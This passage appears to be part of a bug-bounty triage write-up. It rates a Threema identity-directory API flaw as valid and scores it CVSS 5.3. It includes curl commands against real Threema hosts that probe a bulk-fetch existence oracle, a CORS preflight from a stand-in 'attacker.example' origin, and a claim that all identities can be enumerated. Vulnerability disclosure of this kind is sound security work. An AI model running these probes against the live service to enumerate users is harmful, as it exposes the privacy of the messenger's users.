| Q4 | **YES** — Proven via passive GET/POST/HEAD. 30 sequential POSTs at 1 rps all returned HTTP 200, no 429/RateLimit. CORS * confirmed via OPTIONS preflight. |
| Q5 | **YES** — No prior report found. Novel bulk-oracle + cross-origin enumeration vector. |
| Q6 | **Not rejected** — While the directory is by-design public, the bulk-fetch endpoint with silent invalid-ID omission creates an existence oracle beyond intended scope. | Q7 | **YES** — A reasonable triager would accept: unauthenticated, no rate limit, cross-origin, bulk existence oracle on a privacy-sensitive identifier. |

**Verdict: ✅ VALID**

**Minimal read-only proof:**
```
1. curl -s -w "\n%{http_code}" https://ds-apip.threema.ch/identity/ECHOECHO        → 200 + pubkey JSON
2. curl -s -w "\n%{http_code}" https://ds-apip.threema.ch/identity/ZZZZZZZZ        → 404
3. curl -s -X POST https://ds-apip.threema.ch/identity/fetch_bulk \
     -H "Content-Type: application/json" \
     -d '{"identities":["ECHOECHO","ZZZZZZZZ","ABCD1234"]}'                       → 200, only ECHOECHO returned
4. curl -s -i -X OPTIONS https://ds-apip.threema.ch/identity/fetch_bulk \
     -H "Origin: https://attacker.example" \
     -H "Access-Control-Request-Method: POST"                                      → ACAO: *, Allow-Methods: POST,GET,OPTIONS,DELETE
5. Repeat 3-4 for api.threema.ch and apip.threema.ch → identical behavior
```

**Impact:** Mass enumeration of all valid Threema identities + public keys. Cross-origin from any attacker-controlled page. Enables targeted phishing, social engineering, metadata correlation at scale. No rate limiting observed.

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:N/S:U:C:L/I:N/A:N` → **5.3 (Medium)**  
*Rationale:* Network attack, low complexity, no privileges, no user interaction. Confidentiality impact is low (existence of IDs + public keys, which are arguably public). No integrity/availability impact. The cross-origin aspect is captured by UI:N (no user interaction needed).
